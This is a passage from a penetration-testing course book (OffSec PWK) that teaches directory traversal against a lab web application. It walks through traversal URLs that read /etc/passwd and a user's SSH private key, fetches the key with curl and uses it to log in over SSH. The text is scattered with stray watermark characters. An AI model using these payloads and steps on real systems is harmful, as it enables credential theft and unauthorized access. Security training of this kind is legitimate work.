Made in Morocco
Penetration Testing with Kali Linux
Let’s use absolute pathing to show the contents of a file. Beginning with the /home/kali/ path,
let’s display the contents of /etc/passwd.
We’ll begin in the home directory of the kali user with the pwd command. Our second command,
ls /, lists all files and directories in the root file system. The output showing etc is located there. By
specifying the / before etc in the third command, we use an absolute path originating from the
root file system. This means we can use /etc/passwd from any location in the filesystem. If we
were to omit the leading slash, the terminal would search for the etc directory in the home
directory of the kali user, since this is our current directory in the terminal.
kali@kali:~$ pwd
/home/kali
kali@kali:~$ ls /
bin home lib32 media root sys vmlinuz
y
boot initrd.img lib64 mnt run tmp vmlinuz.old
dev initrd.img.old libx32 opt sbin usr
etc lib lost+found proc srv var k
s
kali@kali:~$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologoin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
... n
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
Listing 128 - Dispilay content of /etc/passwd with an absolute path
z
Next, let’s use relative pathing to achieve the same goal. We’ll display the contents of
/etc/passwd using relative paths from the home directory of the kali user. To move back one
D
directory, we can use ../. To move more than one directory backwards, we can combine multiple
../ sequences.
We can use the ls command combined with one ../ sequence to list the contents of the /home
directory, since ../ specifies one directory back. We’ll then use two ../ sequences to list the
contents of the root file system, which contains the etc directory.
kali@kali:~$ pwd
/home/kali
kali@kali:~$ ls ../
kali
kali@kali:~$ ls ../../
bin home lib32 media root sys vmlinuz
boot initrd.img lib64 mnt run tmp vmlinuz.old
dev initrd.img.old libx32 opt sbin usr
etc lib lost+found proc srv var
Listing 129 - Using ../ to get to the root file system
From this point, we can navigate as usual through the file system. We can add etc to two ../
sequences to list all files and directories in the absolute path /etc. In the last command, we use
cat to display the contents of the passwd file by combining the relative path (../../etc/passwd).
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 249
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~$ ls ../../etc
adduser.conf debian_version hostname logrotate.d passwd
...
logrotate.conf pam.d rmt sudoers zsh
kali@kali:~$ cat ../../etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
Listing 130 - Display contents of /etc/passwd with a relative path
y
Let’s analyze another example. While we can use the cat ../../etc/passwd command shown in
listing 130 to display the contents of /etc/passwd, we can achieve the same results using extra ../
k
sequences.
kali@kali:~$ cat ../../../../../../../../../../../setc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin o
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
n
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
Listing 131 - Adding more “../” to the relative path
i
The number of ../ sequences is oznly relevant until we reach the root file system. Theoretically, we
can add as many ../ as we want, since there is nowhere further back to go from /. This can be
useful in certain situationsD, such as when we don’t know our current working directory. In this
case, we could specify a large number of ../ to ensure we reach the root file system from a
relative pathing perspective.
9.1.2 Identifying and Exploiting Directory Traversals
In this section we will explore Directory Traversal385 attacks, also known as path traversal attacks.
This type of attack can be used to access sensitive files on a web server and typically occurs
when a web application is not sanitizing user input.
For a web application to show a specific page, a web server provides the file from the file system.
These files can be located in the web root directory or one of its subdirectories. In Linux systems,
the /var/www/html/ directory is often used as the web root. When a web application displays a
page, http://example.com/file.html for example, it will try to access /var/www/html/file.html. The
http link doesn’t contain any part of the path except the filename because the web root also
serves as a base directory for a web server. If a web application is vulnerable to directory
traversal, a user may access files outside of the web root by using relative paths, thus accessing
sensitive files like SSH private keys or configuration files.
385 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Directory_traversal_attack
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 250
Made in Morocco
Penetration Testing with Kali Linux
While it is important to understand how to exploit Directory Traversal vulnerabilities, it is also
crucial that we can identify them. We should always check for vulnerabilities by hovering over all
buttons, checking all links, navigating to all accessible pages, and (if possible) examining the
page’s source code. Links can be an especially valuable source of information, providing
parameters or other data about the application.
For example, if we find the following link, we can extract vital information from it.
https://example.com/cms/login.php?language=en.html
Listing 132 - Example of a link
First, login.php tells us the web application uses PHP. We can use this information to develop
assumptions about how the web application works, which is helpful for the exploitation phase.
Second, the URL contains a language parameter with an HTML page as its value. In a situation
y
like this, we should try to navigate to the file directly (https://example.com/cms/en.html). If we
can successfully open it, we can confirm that en.html is a file on the server, meaning we can use
this parameter to try other file names. We should always examkine parameters closely when they
use files as a value.
s
Third, the URL contains a directory called cms. This is important information indicating that the
web application is running in a subdirectory of the web root.
o
Let’s review a case study next. We’ll begin by examining the Mountain Desserts web application.
To access it, we’ll need to update the /etc/hosts file on our Kali machine to use the DNS name.
n
We should be aware the assigned IP address for the target machine may change in the labs.
127.0.0.1 localhost
i
127.0.1.1 kali
z
192.168.50.16 mountaindesserts.com
...
D Listing 133 - Contents of /etc/hosts
We will use this hostname for both the current and following demonstrations. Next, let’s browse
to the target web application at http://mountaindesserts.com/meteor/index.php.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 251
Made in Morocco
Penetration Testing with Kali Linux
Figure 121: Mountain Desserts Single Page Application
Figure 121 shows the page after we open it in a browser. The navigation bar displays a file named
index.php, so we can conclude that the web application uses PHP. To gather more information
about the page’s structure, we should hover over all buttons and links, collecting information
about parameters and the different pages we come across.
y
k
Figure 122: Hovering over a Button
s
Scrolling down and hovering over all buttons and links, we’ll notice most of them only link to the
page itself, as shown in Figure 122.
o
At the bottom of the page, we’ll find a link labeled “Admin”.
n
Figure 123: Hovering over the “Admin” Link
i
Figure 123 shows the link previewz when we hover over the Admin link with our cursor, displaying
the URL http://mountaindesserts.com/meteor/index.php?page=admin.php.
D
We know the web application uses PHP and a parameter called “page”, so let’s assume this
parameter is used to display different pages. PHP uses $_GET386 to manage variables via a GET
request. When we click on the link, we receive an error message stating the page is currently
under maintenance.
386 (PHP Manual, 2022), https://www.php.net/manual/en/reserved.variables.get.php
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 252
Made in Morocco
Penetration Testing with Kali Linux
Figure 124: Error Message of Admin Link
This is an important detail for us, since it reveals that information is shown on the same page. In
this case, we’ll make a few assumptions about how the web application could be developed to
behave in such a way. For example, when we open mountaindesserts.com/meteor/admin.php in
our browser, we’ll notice the same message that was shown on the index.php page after clicking
the “Admin” link.
y
k
Figure 125: Maintenance of Admin Page
This message indicates the web application includess the content of this page via the page
parameter and displays it under the “Admin” link. We can now try to use ../ to traverse directories
in the potentially-vulnerable parameter. We’ll speocify a relative path to /etc/passwd to test the
page parameter for directory traversal.
http://mountaindesserts.com/meteor/indenx.php?page=../../../../../../../../../etc/passw
d
Listing 134 - Entire URL of our Directory Traversal attack
i
Let’s copy the shown URL from liszting 134 into the address bar of our browser.
D
Figure 126: Web Application shows contents of Passwd File
Figure 126 shows the contents of /etc/passwd. We successfully leveraged the directory traversal
vulnerability by using a relative path.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 253
Made in Morocco
Penetration Testing with Kali Linux
Directory traversal vulnerabilities are mostly used for gathering information. As mentioned before,
if we can access certain files containing sensitive information, like passwords or keys, it may lead
to system access.
In most cases, the web server is run in the context of a dedicated user such as www-data. These
users usually have limited access permissions on the system. However, users and administrators
often intentionally set file access permissions to be very permissive or even world-readable.
Sometimes this occurs due to time constraints in deployment or less-mature security programs.
This means we should always check for the existence of SSH keys and their access permissions.
SSH keys are usually located in the home directory of a user in the .ssh folder. Fortunately for us,
/etc/passwd also contains the home directory paths of all users, as shown in Figure 126. The
output of /etc/passwd shows a user called offsec. Let’s specify a relative path for the vulnerable
“page” parameter to try and display the contents of the user’s private key.
y
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offs
ec/.ssh/id_rsa
k
Listing 135 - Entire URL of our Directory Traversal attack
Let’s copy the shown URL from listing 135 into the address bar of our browser.
s
o
n
i
z
D
Figure 127: Content of SSH Private Key
Figure 127 shows that we successfully retrieved the private key for the offsec user. Reviewing the
output, we’ll notice that its formatting is a bit messy.
During web application assessments, we should understand that as soon as we’ve identified a
possible vulnerability, such as with the “page” parameter in this case, we should not rely on a
browser for testing. Browsers often try to parse or optimize elements for user friendliness. When
performing web application testing, we should mainly use tools such as Burp,387 cURL,388 or a
programming language of our choice.
387 (PortSwigger, 2022), https://portswigger.net/burp
388 (Curl, 2022), https://curl.se/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 254
Made in Morocco
Penetration Testing with Kali Linux
Let’s use curl to retrieve the SSH private key as we did with the browser.
kali@kali:~$ curl
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offs
ec/.ssh/id_rsa
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
...
lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUyVJ/XxpBrb
iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
-----END OPENSSH PRIVATE KEY----- k
...
Listing 136 - SSH Private Key via curl
s
Listing 136 shows that the SSH private key is formatted better using curl than in the browser.
Let’s copy the output from the terminal and pasteo it into a file called dt_key in the home directory
for the kali user.
Let’s use the private key to connect to the ntarget system via SSH on port 2222. We can use the -i
parameter to specify the stolen private key file and -p to specify the port. Before we can use the
private key, we’ll need to modify the permissions of the dt_key file so that only the user / owner
i
can read the file; if we don’t, the ssh program will throw an error stating that the access
z
permissions are too open.
kali@kali:~$ ssh -i dt_keDy -p 2222 PI:EMAIL
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be
established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@ WARNING: UNPROTECTED PRIVATE KEY FILE! @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
...
kali@kali:~$ chmod 400 dt_key
kali@kali:~$ ssh -i dt_key -p 2222 PI:EMAIL
...
offsec@68b68f3eb343:~$
Listing 137 - Using the Private Key to connect via SSH
Before wrapping up this section, let’s briefly examine directory traversal attacks on Windows. On
Linux, we usually use the /etc/passwd file to test directory traversal vulnerabilities. On Windows,
we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 255
Made in Morocco
Penetration Testing with Kali Linux
vulnerabilities, which is readable by all local users. By displaying this file, we can confirm the
vulnerability exists and understand how the web application displays the contents of files. After
confirming the vulnerability, we can try to specify files containing sensitive information such as
configuration files and logs.
In general, it is more difficult to leverage a directory traversal vulnerability for system access on
Windows than Linux. In Linux systems, a standard vector for directory traversal is to list the users
of the system by displaying the contents of /etc/passwd, check for private keys in their home
directory, and use them to access the system via SSH. This vector is not available on Windows
and unfortunately, there is no direct equivalent. Additionally, sensitive files are often not easily
found on Windows without being able to list the contents of directories. This means to identify
files containing sensitive information, we need to closely examine the web application and collect
information about the web server, framework, and programming language.
Once we gather information about the running application or servyice, we can research paths
leading to sensitive files. For example, if we learn that a target system is running the Internet
Information Services (IIS)389 web server, we can research its log paths and web root structure.
k